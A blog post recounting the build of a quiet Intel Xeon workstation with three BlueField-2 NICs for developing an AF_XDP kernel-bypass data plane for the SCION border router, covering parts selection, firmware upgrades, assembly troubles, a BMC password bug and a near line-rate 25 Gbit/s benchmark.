    &lt;p&gt;The only real way to further improve the OSS data plane performance is to bypass the Linux kernel's networking stack and fly by private jet:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;you enter the airport (Network Interface Controller)&lt;/item&gt;
      &lt;item&gt;you're escorted directly to your private jet (zero-copy fast path to XSK)&lt;/item&gt;
      &lt;item&gt;you board the plane and you're done (user-space frame buffer)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;There are several ways in which you can bypass the kernel, namely:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;DPDK: a user-space networking framework that bypasses the Linux networking stack entirely, typically requiring exclusive control over the NIC and removing it from the kernel's standard networking stack.&lt;/item&gt;
      &lt;item&gt;AF_XDP: a Linux kernel mechanism that allows high-performance packet I/O via a shared memory ring between the NIC driver and user space.&lt;/item&gt;
      &lt;item&gt;VPP: a high-performance user-space packet processing framework that uses vectorized, batch-based processing and is commonly backed by DPDK or AF_XDP for packet I/O.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Even though DPDK is the current de facto industry standard for kernel bypass and can likely achieve higher peak performance, we opted for Linux's native AF_XDP. Given that our open-source border router is written in Go, and that usability, maintainability, and operational simplicity are among our highest priorities, AF_XDP provides a better set of trade-offs.&lt;/p&gt;
    &lt;p&gt;AF_XDP is based on Express Data Path (XDP), which in turn is based on Extended Berkeley Packet Filter (eBPF).&lt;/p&gt;
    &lt;p&gt;In a nutshell, you write a small program in restricted C, subject to strict limits on instruction count (up to ~1 million), loops, and memory access, which is compiled into eBPF bytecode, verified by the kernel's eBPF verifier and loaded into the kernel at runtime, and executed for every incoming packet to decide how it is handled.&lt;/p&gt;
    &lt;p&gt;In the SCION border router, we therefore need to:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;mmap a sufficiently large region of memory (ideally using hugepages) referred to as UMEM.&lt;/item&gt;
      &lt;item&gt;initialize the fill, completion, tx and rx rings.&lt;/item&gt;
      &lt;item&gt;bind an AF_XDP socket to a NIC queue (ideally, in &lt;code&gt;XDP_ZEROCOPY&lt;/code&gt;mode, if the hardware and driver support it).&lt;/item&gt;
      &lt;item&gt;load a small eBPF/XDP program into the kernel that redirects packets into frames in the mmapped user-space memory.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This allows raw packet frames to be delivered directly into the border router software with minimal overhead for further processing completely bypassing the network stack.&lt;/p&gt;
    &lt;p&gt;So far so good - but there are problems:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Typical VM offerings don't expose the access needed for XDP/AF_XDP (especially in zero-copy mode). In practice, you usually need bare metal. You cannot open an AF_XDP socket to send raw packets on, for example, an AWS EC2 instance.&lt;/item&gt;
      &lt;item&gt;None of the Linux machines currently at our disposal are equipped with NICs that support AF_XDP in &lt;code&gt;XDP_ZEROCOPY&lt;/code&gt;mode.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;As a result, the only way to properly test and develop a zero-copy-capable AF_XDP underlay is to obtain hardware that supports it, which is not commonly available in off-the-shelf consumer-grade systems.&lt;/p&gt;
    &lt;p&gt;Our new goal was to achieve 25 Gbit/s on a single thread of the border router in our benchmark topology on a relatively small budget, both in terms of time and money. The only place we could deploy the machine is our not-so-noisy office. This makes a low noise profile a hard requirement, further narrowing our options.&lt;/p&gt;
    &lt;p&gt;I identified 3 main options:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Find a suitable used rack server and build The LackRack &lt;list rend="ul"&gt;&lt;item&gt;relatively cheap 👍&lt;/item&gt;&lt;item&gt;abundantly available 👍&lt;/item&gt;&lt;item&gt;often very noisy 👎&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Find a suitable used tower server with a lower noise profile &lt;list rend="ul"&gt;&lt;item&gt;cheap 👍&lt;/item&gt;&lt;item&gt;typically limited in NIC options and available PCIe lanes 👎&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Build a new system from scratch &lt;list rend="ul"&gt;&lt;item&gt;exactly the configuration we need 👍&lt;/item&gt;&lt;item&gt;likely expensive 👎&lt;/item&gt;&lt;item&gt;likely requires significant effort and manhours 👎&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Finding a suitable used machine under $5,000 that would also be quiet enough to operate inside our office proved challenging. After many hours spent browsing various marketplaces, it became clear that building the system ourselves was the more practical option at the time.&lt;/p&gt;
    &lt;p&gt;I therefore started by evaluating suitable NICs. After some research, the following candidates emerged:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Intel Ethernet 800 Series (E810 family) (&lt;code&gt;ice&lt;/code&gt;driver)&lt;/item&gt;
      &lt;item&gt;NVIDIA/Mellanox ConnectX-5,6,7 (&lt;code&gt;mlx5&lt;/code&gt;driver)&lt;/item&gt;
      &lt;item&gt;Broadcom NetXtreme-E (BCM57xxx / BCM588xx series) (&lt;code&gt;bnxt_en&lt;/code&gt;driver)&lt;/item&gt;
      &lt;item&gt;FastLinQ (QL41xxx / QL45xxx series) (&lt;code&gt;qede&lt;/code&gt;driver)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The NICs would later determine the requirements for the rest of the system.&lt;/p&gt;
    &lt;p&gt;I was quite lucky to have a friend who works on networking at a large US tech company help me plan and build this system. He asked not to be named, so we'll refer to him as Frank throughout the article.&lt;/p&gt;
    &lt;p&gt;Eventually, I found the Mellanox NVIDIA BlueField-2 DPUs (Data Processing Units, a.k.a. "smart NICs") with dual 25 Gbit/s ports to be a good deal on piospartslap.de and ordered 3 cards for just 289,92€ plus 49,99€ for the express delivery (a total of CHF 318.09). After reaching out, they kindly agreed to a discounted price of 115€ per card (excluding VAT).&lt;/p&gt;
    &lt;p&gt;Now it was time to plan out the rest of the system.&lt;/p&gt;
    &lt;p&gt;Before choosing the mainboard, it was necessary to decide between going team Red 🔴 (AMD) and going team Blue 🔵 (Intel).&lt;/p&gt;
    &lt;p&gt;I chose to build an Intel-based system because Intel still tends to have a slight edge in the networking space, particularly due to platform features such as Intel Data Direct I/O (DDIO), which allows NICs to DMA packet data directly into the CPU's L3 cache instead of main memory.&lt;/p&gt;
    &lt;p&gt;In our benchmark topology we ideally need 5-6 NICs. Three BF-2 cards, each with 2 ports, consume one PCIe slot and 8 PCIe Gen4 lanes (16 GT/s), which means the system needs a proper workstation-grade mainboard that can not only accommodate this configuration but also leave room for future expansion. Once we reach 25 Gbit/s, it would be desirable to have the option to upgrade the NICs and move toward the 100 Gbit/s range without having to replace the entire platform.&lt;/p&gt;
    &lt;p&gt;There aren't that many mainboards that fit these requirements, and these two stood out:&lt;/p&gt;
    &lt;p&gt;Both are within budget, both offer remote management capabilities, and both provide seven full 16× PCIe Gen5 slots. However, the MS03-CE0 was not readily available and would have required waiting several weeks for delivery from China. Naturally, I went for the ASUS SAGE SE.&lt;/p&gt;
    &lt;p&gt;ASUS lists a wide range of supported LGA4677 CPUs for the W790E-SAGE SE:&lt;/p&gt;
    &lt;p&gt;Frank happened to have a Sapphire Rapids Q03J engineering/qualification sample CPU with 60 (!) cores for the LGA4677 socket that he wanted to sell anyway, and he also had access to an ASUS Pro WS W790E-SAGE SE to test it on.&lt;/p&gt;
    &lt;p&gt;Unfortunately, the Q03J and SAGE SE combination didn't work. The system didn't boot, so that option was off the table. I couldn't find any decent second-hand offers either, which left me with no real choice but to buy a brand-new CPU.&lt;/p&gt;
    &lt;p&gt;I would have preferred to use an Intel Xeon W-3400 workstation CPU, but prices on galaxus.ch and digitec.ch started at around CHF ~1600, which sadly exceeded our budget. So I had to opt for the cheaper 2000 series. The best CPU I could find available in swiss stocks was the Intel Xeon W5-2455X, a 12-core CPU with a 3.2 GHz base clock and 64× PCIe Gen5 lanes, providing enough headroom for potential future expansion at a rather bearable cost of CHF 1105,-.&lt;/p&gt;
    &lt;p&gt;There were a couple of CPU cooler options and Frank suggested either of:&lt;/p&gt;
    &lt;p&gt;Being a happy Noctua client, I just went with the NH-U14S.&lt;/p&gt;
    &lt;p&gt;There were also liquid cooling options but having had to maintain a liquid cooled CPU in the past, I didn't feel it was a good fit for this setup and the Noctua NH-U14S would probably be silent enough anyway.&lt;/p&gt;
    &lt;p&gt;It quickly became apparent that the ongoing RAM shortage had already affected the market, making it difficult to find suitable DDR5 ECC memory that was both in stock and reasonably priced.&lt;/p&gt;
    &lt;p&gt;Fortunately, a Corsair DDR5 RDIMM kit (64 GB, 4×16 GB, 5600 MT/s) was available on Galaxus, so I picked it right away.&lt;/p&gt;
    &lt;p&gt;The M.2 SSD was the easiest component to decide on. I simply went with a 1TB Samsung 990 Pro with a heatsink being absolutely sure there won't be any problems. It's widely available, and Digitec even promised next-day delivery.&lt;/p&gt;
    &lt;p&gt;The workstation was supposed to work 24/7 as a server so picking a reliable PSU is quite important.&lt;/p&gt;
    &lt;p&gt;After careful considering, I went with the Corsair RM850e&lt;/p&gt;
    &lt;p&gt;To be honest - I heavily underestimated the task of finding the right SSI-EEB case. I mean, a case is just a piece of sheet metal, how hard can it be to find the right piece of metal, right?!&lt;/p&gt;
    &lt;p&gt;First, consider the BlueField-2 NIC shown below.&lt;/p&gt;
    &lt;p&gt;These cards do not have active cooling. They are equipped only with a small, thin heatsink and are designed to be installed in server racks with very noisy high-RPM, high-pressure airflow. As a result, they run extremely hot under normal operation.&lt;/p&gt;
    &lt;p&gt;Server-grade hardware like this is typically expected to operate continuously at high loads, often without dynamic power management. This becomes problematic in a workstation tower office setup, as it requires a case that allows fans to be mounted in very close proximity to the cards, to provide sufficient airflow and static pressure to keep them within safe and sustainable operating temperatures, at least at around 50-60°C (122-140°F).&lt;/p&gt;
    &lt;p&gt;I did find the Silverstone RM52 to be an option worth considering:&lt;/p&gt;
    &lt;p&gt;Though at a price of CHF ~450 it was, to put it mildly, too expensive.&lt;/p&gt;
    &lt;p&gt;After nearly losing my sanity browsing both new and second-hand listings, I finally came across the Phanteks Enthoo Pro II tower case with a very convenient fan mount:&lt;/p&gt;
    &lt;p&gt;Finally, everything except the case coolers was decided upon and ordered.&lt;/p&gt;
    &lt;p&gt;The shopping list was finally complete:&lt;/p&gt;
    &lt;p&gt;That, plus CHF ~170,- for the Phanteks case, makes a total of CHF 3210,-. It could probably have been cheaper, but I really wanted to get most of the work done before heading off on my three-week vacation.&lt;/p&gt;
    &lt;p&gt;However, at the time of writing, just months later, the price of the RAM kit went up by 232%! Memory supply seems to have gotten a lot worse.&lt;/p&gt;
    &lt;p&gt;The first components to arrive were the BlueField-2 NICs, followed shortly by the ASUS mainboard, as expected. A bit later, the CPU cooler and the SSD arrived as well.&lt;/p&gt;
    &lt;p&gt;After a significant delay, the CPU, PSU, and RAM finally showed up too. The RAM delay was unsurprising.&lt;/p&gt;
    &lt;p&gt;The delivery of the Phanteks case was delayed, and no updated or approximate delivery date was available at the time, so I had to start assembling the system without the case.&lt;/p&gt;
    &lt;p&gt;Last but not least, I needed three SFP28 DAC cables to interconnect the NICs between each other. I was honestly surprised by how expensive these cables are. Domestic Swiss offers ranged from CHF 50,- per cable all the way up to CHF 150,-! Of course, there's always the option to order them from China for a fraction of the price, but shipping typically takes 2-4 weeks.&lt;/p&gt;
    &lt;p&gt;Luckily, I managed to find a few at a much lower price on Ricardo!&lt;/p&gt;
    &lt;p&gt;Since the cards arrived early, the first thing I had to do was upgrade their firmware. These cards often ship with outdated firmware, so updating it is essential, otherwise you may face all sorts of problems and lower performance.&lt;/p&gt;
    &lt;p&gt;However, since the new workstation system wasn't ready yet, I decided to try installing them on my ancient gaming rig back from around the 2010s. The BigBang X-Power II PCIe Gen3 should have been enough to run the BF-2 NICs.&lt;/p&gt;
    &lt;p&gt;Sadly, when I powered it on, it zapped ⚡⚡⚡ and the unmistakable smell of electronic death quickly filled the room. After more than 11 years of service, my old machine's VRM had finally given up.&lt;/p&gt;
    &lt;p&gt;Rest in peace, comrade 🪦.&lt;/p&gt;
    &lt;p&gt;Luckily, I have a new gaming PC with Linux on it. I just didn't want to disassemble it, but now I had no choice. The fans and the fat RTX 3090 with the bracket that prevents it from bending the PCIe slot under its immense weight needed to be removed and make space for the tiny BlueField-2.&lt;/p&gt;
    &lt;p&gt;I also installed the new SSD and installed an Ubuntu system on it.&lt;/p&gt;
    &lt;p&gt;When I first booted the gaming PC with the BF-2 NIC installed, I was a bit scared when I saw UEFI report:&lt;/p&gt;
    &lt;code&gt;mlx5_core - over 120000 MS in pre-initializing state, aborting
mlx5_core: mlx5_init_one failed with error code -110
&lt;/code&gt;
    &lt;p&gt;Apparently, this is normal, especially for the very first cold boot. These BlueField-2 cards are not your regular network card. They're DPUs, which is essentially an entire PCIe based computer with its own Linux subsystem running on their own 8-core ARM Cortex-A72 CPUs with 16 GB of DDR4 ECC RAM. No wonder these cards get so hot, they're insane! On the first boot, this system has to boot and initialize itself, which apparently makes my UEFI believe that it's dead. After letting it sit for a while and rebooting again - everything was fine and I managed to boot into Ubuntu and proceed with the firmware upgrade.&lt;/p&gt;
    &lt;p&gt;I also checked temperatures, just to be on the safe side, and they appeared to be fine:&lt;/p&gt;
    &lt;code&gt;~$ sensors
...
mlx5-pci-0601
Adapter: PCI adapter
asic:         +57.0°C  (crit = +105.0°C, highest = +58.0°C)
...&lt;/code&gt;
    &lt;p&gt;Previously, I removed one of the fans from my old, dead computer and placed it right next to the NIC's heatsink to get some airflow through it. That seems to have been sufficient.&lt;/p&gt;
    &lt;p&gt;Before I could do anything with the cards, I needed to install the NVIDIA DOCA Host-Server package on the freshly installed Ubuntu system, which is fairly easy to do by following the documentation.&lt;/p&gt;
    &lt;p&gt;Then I needed to confirm the card is visible on PCIe, and it was:&lt;/p&gt;
    &lt;code&gt;lspci | grep Mellanox
06:00.0 Ethernet controller: Mellanox Technologies MT42822 BlueField-2 integrated ConnectX-6 Dx network controller (rev 01)
06:00.1 Ethernet controller: Mellanox Technologies MT42822 BlueField-2 integrated ConnectX-6 Dx network controller (rev 01)
06:00.2 Ethernet controller: Mellanox Technologies Device c2d1 (rev 01)
06:00.3 DMA controller: Mellanox Technologies MT42822 BlueField-2 SoC Management Interface (rev 01)&lt;/code&gt;
    &lt;p&gt;I started the Mellanox software tools driver set:&lt;/p&gt;
    &lt;code&gt;sudo mst start&lt;/code&gt;
    &lt;p&gt;And now, I could query the current firmware:&lt;/p&gt;
    &lt;code&gt;sudo mlxfwmanager --online
Querying Mellanox devices firmware ...

Device #1:
----------

  Device Type:      BlueField2
  Part Number:      0JNDCM_Dx
  Description:      NVIDIA Bluefield-2 Dual Port 25 GbE SFP Crypto DPU
  PSID:             DEL0000000033
  PCI Device Name:  /dev/mst/mt41686_pciconf0
  Base GUID:        58a2e1030004a9da
  Base MAC:         58a2e104a9da
  Versions:         Current        Available     
     FW             24.36.7506     N/A           
     PXE            3.7.0200       N/A           
     UEFI           14.31.0010     N/A           
     UEFI Virtio blk   22.4.0010      N/A           
     UEFI Virtio net   21.4.0010      N/A           

  Status:           No matching image found
&lt;/code&gt;
    &lt;p&gt;The installed firmware &lt;code&gt;24.36.7506&lt;/code&gt; was clearly not up to date. What I expected to see
there is &lt;code&gt;24.46.3048&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;So I proceeded to bfb-install:&lt;/p&gt;
    &lt;code&gt;sudo bfb-install --bfb ~/bf-fwbundle-3.1.0-82_25.07-prod.bfb --rshim rshim0&lt;/code&gt;
    &lt;p&gt;After a while, the upgrade completed successfully, and I had to power down the system completely for a few seconds so that the new firmware would be used after the reboot:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;old version&lt;/cell&gt;
        &lt;cell role="head"&gt;new version&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;
          &lt;code&gt;FW&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;24.36.7506&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;24.46.3048&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;
          &lt;code&gt;PXE&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;3.7.0200&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;3.8.0100&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;UEFI&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;14.31.0010&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;14.39.0014&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;I repeated this process for all three cards. It took a while, but it was simpler than I had expected.&lt;/p&gt;
    &lt;p&gt;As I mentioned earlier, the BlueField-2s are DPUs, not simple NICs. But they can very well function just like simple 25 Gbit/s NICs if you want them to. And this part of the DOCA documentation explains how, so I won't repeat the steps here.&lt;/p&gt;
    &lt;p&gt;This switch is necessary because, in DPU mode, packet processing is routed through the onboard ARM cores and the embedded switch, which adds unnecessary complexity and latency for our use case. NIC mode effectively turns the BlueField-2 into a conventional high-performance NIC and removes the DPU from the data path.&lt;/p&gt;
    &lt;p&gt;Finally, it was time to start assembling the new SCION workstation. To be honest, I got a bit nervous. The last time I assembled a system was years ago. I had help from my younger brother and it wasn't nearly as expensive as this shiny new piece of workstation hardware.&lt;/p&gt;
    &lt;p&gt;Before touching any component, I plugged the PSU into the wall and grounded myself on it to prevent static electricity from damaging the delicate circuitry. This I regularly repeated throughout the whole process just to be on the safe side.&lt;/p&gt;
    &lt;p&gt;For the first time in my life, I held a server-grade CPU in my hand - and I have to say, it's massive! Easily two to three times the size of a typical consumer CPU.&lt;/p&gt;
    &lt;p&gt;The installation process does differ from your regular consumer CPU, and it's explained in full detail here.&lt;/p&gt;
    &lt;p&gt;I installed the CPU + cooler, RAM, M.2 SSD, and connected the power wiring:&lt;/p&gt;
    &lt;p&gt;By the way, the RAM was installed incorrectly, as I later found out and fixed according to the manual:&lt;/p&gt;
    &lt;code&gt;Intel® Xeon® W-2400 Series Processors do not support
DIMM_C1, DIMM_D1, DIMM_G1, and DIMM_H1
&lt;/code&gt;
    &lt;p&gt;I clicked the power button, and... it almost booted. But something was wrong. I couldn't SSH into the Ubuntu system I had installed on this M.2 SSD.&lt;/p&gt;
    &lt;p&gt;Frank suggested reseating the CPU, as uneven screw pressure can cause poor contact in the LGA4677 socket. In that case, the system may fail to boot or lose access to some PCIe lanes if the pins don't line up perfectly. The Q-code LED displayed &lt;code&gt;64&lt;/code&gt;, which, according
to the manual, means &lt;code&gt;CPU DXE initialization is started&lt;/code&gt;. At that point, I assumed
something had to be wrong with either the CPU or RAM. I reseated both multiple times, wasting several hours in the process, but without any success.&lt;/p&gt;
    &lt;p&gt;I even installed the old GTX TITAN GPU, which I previously confirmed to have worked on another system:&lt;/p&gt;
    &lt;p&gt;and even though its LEDs lit up I was left with a frustrating "no signal" message on the HDMI connected display. At this point, I started suspecting the worst. As you might have guessed - I didn't get a good night's sleep.&lt;/p&gt;
    &lt;p&gt;The next day, however, I had to confront the sheer size of my own stupidity. If you look again at the photo of the installed GPU above, you'll notice that - for reasons unknown even to myself - I had installed it in PCIe slot 2, which is not supported by the Intel Xeon W5-2455X.&lt;/p&gt;
    &lt;p&gt;And it turns out, Q-code &lt;code&gt;64&lt;/code&gt; was just the last code displayed and didn't actually indicate any fault at all. In fact, everything was okay.&lt;/p&gt;
    &lt;p&gt;So I moved the graphics card to PCIe slot 1 and was finally able to enter the UEFI menu, only to run into the next surprise: the M.2 SSD wasn't recognized.&lt;/p&gt;
    &lt;p&gt;Some time later, I once again realized that I needed to pay closer attention to the manual:&lt;/p&gt;
    &lt;code&gt;M.2_1 and M.2_2 slots will be disabled once an Intel® Xeon® W-2400 Series
Processor is installed.
&lt;/code&gt;
    &lt;p&gt;After moving the M.2 SSD to slot 3, everything worked just fine.&lt;/p&gt;
    &lt;p&gt;As a proper server-/workstation-grade mainboard, this ASUS SAGE SE has the ASPEED AST2600 remote management system on it. It allows you to access its web UI over a dedicated ethernet port, independent of the actual host system and control almost everything remotely, even if the host system is down or corrupted. It even gives you screen-sharing remote control.&lt;/p&gt;
    &lt;p&gt;The first time I entered the BMC UI, it asked me to change the admin password, which I did.&lt;/p&gt;
    &lt;p&gt;Later, when I tried to sign in again, it refused to let me in, claiming I had entered incorrect credentials - which was simply not true. Long story short: the AST2600 firmware has a bug. It allows you to set a password that exceeds the maximum supported length without showing any error. Internally, it appears to hash the overlong string as-is, so even trimming the password to the maximum length during login doesn't work. The result is a self-inflicted lockout.&lt;/p&gt;
    &lt;p&gt;I found it out by using ipmitool:&lt;/p&gt;
    &lt;code&gt;~ % ipmitool -I lanplus -H 192.168.1.152 -U admin -P $PASS
chassis status lanplus: password is longer than 20 bytes.&lt;/code&gt;
    &lt;p&gt;The only way to recover from this is to log into the host system and reset the BMC password using &lt;code&gt;ipmitool&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Now that the Phanteks Enthoo Pro II case had finally arrived, it was time to move the system into its new home.&lt;/p&gt;
    &lt;p&gt;During installation, I accidentally left a standoff in the wrong place. The motherboard's backplate drew first blood - and I almost cried.&lt;/p&gt;
    &lt;p&gt;The system was finally mounted in the chassis, and the Enthoo Pro II's brackets allowed me to mount the NIC fan quite elegantly, even if it couldn't be placed perfectly close.&lt;/p&gt;
    &lt;p&gt;But one last piece of the puzzle was still missing: air circulation. So I came up with a concept:&lt;/p&gt;
    &lt;p&gt;and a new shopping list:&lt;/p&gt;
    &lt;p&gt;I decided to go with the more expensive Noctua fans again to keep the noise profile as low as possible. The NF-A12x25 G2 PWM fans are optimized for static pressure, and one of them would be responsible for providing sufficient airflow through the NIC heatsinks.&lt;/p&gt;
    &lt;p&gt;A short while later, they arrived:&lt;/p&gt;
    &lt;p&gt;And I had lots of fun installing them. Just kidding - it was tedious work, and my back hurt so much afterward that not even a good hot bath helped.&lt;/p&gt;
    &lt;p&gt;Once again, I grossly underestimated the effort required for cable management, planning, and execution. I even had to reroute and rewire parts of the setup after realizing that one connector sat far too close to a very hot heatsink - clearly asking for trouble.&lt;/p&gt;
    &lt;p&gt;But in the end, I was really happy with how it turned out:&lt;/p&gt;
    &lt;p&gt;Cable management was decent. Temperatures were great and sustainable, and even at 30-50% fan speed the system was barely audible, even in complete silence.&lt;/p&gt;
    &lt;code&gt;~$ sensors
coretemp-isa-0000
Adapter: ISA adapter
Package id 0:  +23.0°C  (high = +92.0°C, crit = +100.0°C)
Core 0:        +21.0°C  (high = +92.0°C, crit = +100.0°C)
Core 1:        +22.0°C  (high = +92.0°C, crit = +100.0°C)
Core 2:        +20.0°C  (high = +92.0°C, crit = +100.0°C)
Core 3:        +22.0°C  (high = +92.0°C, crit = +100.0°C)
Core 4:        +23.0°C  (high = +92.0°C, crit = +100.0°C)
Core 5:        +22.0°C  (high = +92.0°C, crit = +100.0°C)
Core 6:        +21.0°C  (high = +92.0°C, crit = +100.0°C)
Core 7:        +22.0°C  (high = +92.0°C, crit = +100.0°C)
Core 8:        +20.0°C  (high = +92.0°C, crit = +100.0°C)
Core 9:        +20.0°C  (high = +92.0°C, crit = +100.0°C)
Core 10:       +21.0°C  (high = +92.0°C, crit = +100.0°C)
Core 11:       +21.0°C  (high = +92.0°C, crit = +100.0°C)

mlx5-pci-bc01
Adapter: PCI adapter
asic:         +62.0°C  (crit = +105.0°C, highest = +74.0°C)

mlx5-pci-8501
Adapter: PCI adapter
asic:         +57.0°C  (crit = +105.0°C, highest = +66.0°C)

mlx5-pci-4e01
Adapter: PCI adapter
asic:         +59.0°C  (crit = +105.0°C, highest = +70.0°C)

nvme-pci-0100
Adapter: PCI adapter
Composite:    +27.9°C  (low  = -273.1°C, high = +81.8°C)
                       (crit = +84.8°C)
Sensor 1:     +27.9°C  (low  = -273.1°C, high = +65261.8°C)
Sensor 2:     +31.9°C  (low  = -273.1°C, high = +65261.8°C)

mlx5-pci-bc00
Adapter: PCI adapter
asic:         +62.0°C  (crit = +105.0°C, highest = +74.0°C)

mlx5-pci-8500
Adapter: PCI adapter
asic:         +57.0°C  (crit = +105.0°C, highest = +66.0°C)

mlx5-pci-4e00
Adapter: PCI adapter
asic:         +59.0°C  (crit = +105.0°C, highest = +70.0°C)&lt;/code&gt;
    &lt;p&gt;One more thing left to do was to configure this workstation for upcoming work. I needed to figure out which NIC is which in Linux and interconnect them.&lt;/p&gt;
    &lt;p&gt;The easiest way to do so was to connect a card to itself (port 1 -&amp;gt; port 2), then check &lt;code&gt;sudo mst status&lt;/code&gt; and write down a map of &lt;code&gt;/dev/mst/mt*&lt;/code&gt;
to their respective &lt;code&gt;domain:bus:dev.fn&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Then check all mst devices &lt;code&gt;sudo mlxlink -d /dev/mst/mt41686_pciconf1 -p 1&lt;/code&gt; status.
The one where the "Troubleshooting Info - Recommendation" says "No issue was observed"
is the one currently wired one.&lt;/p&gt;
    &lt;p&gt;Under /etc/udev/rules.d/10-bf2-names.rules I placed a new config file mapping names to their respective MACs (MAC addresses are redacted here):&lt;/p&gt;
    &lt;code&gt;### TOP CARD — PCIEX16(G5)_3 — PCI domain:bus:dev.fn=0000:85:00.0
SUBSYSTEM=="net", ACTION=="add", ATTR{address}=="00:00:00:00:00:00", NAME="top_1"
SUBSYSTEM=="net", ACTION=="add", ATTR{address}=="00:00:00:00:00:00", NAME="top_2"

### CENTER CARD — PCIEX16(G5)_5 — PCI domain:bus:dev.fn=0000:4e:00.0
SUBSYSTEM=="net", ACTION=="add", ATTR{address}=="00:00:00:00:00:00", NAME="center_1"
SUBSYSTEM=="net", ACTION=="add", ATTR{address}=="00:00:00:00:00:00", NAME="center_2"

### BOTTOM CARD — PCIEX16(G5)_7 — PCI domain:bus:dev.fn=0000:bc:00.0
SUBSYSTEM=="net", ACTION=="add", ATTR{address}=="00:00:00:00:00:00", NAME="bottom_1"
SUBSYSTEM=="net", ACTION=="add", ATTR{address}=="00:00:00:00:00:00", NAME="bottom_2"&lt;/code&gt;
    &lt;p&gt;After reloading I could now easily identify the individual ports by their name.&lt;/p&gt;
    &lt;code&gt;sudo udevadm control --reload
sudo udevadm trigger&lt;/code&gt;
    &lt;code&gt;~$ ip -br link
lo               UNKNOWN        00:00:00:00:00:00 &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; 
eno3np0          UP             00:00:00:00:00:00 &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; 
eno2np1          UP             00:00:00:00:00:00 &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; 
enx96cd268bdb7b  UP             00:00:00:00:00:00 &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; 
center_1         UP             00:00:00:00:00:00 &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; 
center_2         UP             00:00:00:00:00:00 &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; 
top_1            UP             00:00:00:00:00:00 &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; 
top_2            UP             00:00:00:00:00:00 &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; 
bottom_1         UP             00:00:00:00:00:00 &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; 
bottom_2         UP             00:00:00:00:00:00 &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; 
docker0          DOWN           00:00:00:00:00:00 &amp;lt;NO-CARRIER,BROADCAST,MULTICAST,UP&amp;gt; &lt;/code&gt;
    &lt;p&gt;The biggest challenge with our office is that it's located inside a banking infrastructure company's building. While they do provide a way for us to connect to the outside, we can't directly access anything on the inside. Unless, of course, we use Tailscale.&lt;/p&gt;
    &lt;p&gt;To access the BMC web interface from outside the office, I configured a small Linux machine in the office, connected to the same switch as the workstation, and tunneled the connection through Tailscale.&lt;/p&gt;
    &lt;p&gt;By the way, finding the BMC's LAN IP and MAC address turned into yet another multi-hour adventure, as they weren't written down anywhere - not in the documentation and not on the board itself. First, I tried to scan the local network, but that approach proved futile. Later, I connected my MacBook to the management port directly via ethernet cable and used &lt;code&gt;tcpdump&lt;/code&gt; to inspect the traffic and determine the MAC.
Unfortunately, it seems like the ASPEED AST2600 BMC doesn't speak proper
ARP.
There is however a short window of time right after a cold boot of the system
when it sends ICMPv6 packets, which reveal its MAC.&lt;/p&gt;
    &lt;p&gt;I started writing AF_XDP experiments, and you can find the code at: github.com/romshark/afxdp-bench-go&lt;/p&gt;
    &lt;p&gt;Eventually, I managed to send 1.5 TB of data in just over eight minutes from one card to another at 24.6 Gbit/s (practically line rate), using an MTU of 1500 bytes per packet:&lt;/p&gt;
    &lt;code&gt;FINAL REPORT
 Elapsed:           487.657 s
 TX:                1,000,000,000 packets
 RX:                1,000,000,000 packets
 TX Avg PPS:        2,050,621
 RX Avg PPS:        2,050,621
 TX Avg rate:       24,607.5 Mbps
 RX Avg rate:       24,607.5 Mbps
 Dropped:           0 (0.0000%)

real    8m10.217s
user    0m0.009s
sys     0m0.017s
Requested TX:       1000000000
Egress:
  tx_packets_phy delta: 1000000126
  tx_bytes_phy   delta: 1504000017713
Ingress:
  rx_packets_phy delta: 1000000126
  rx_bytes_phy   delta: 1504000017713&lt;/code&gt;
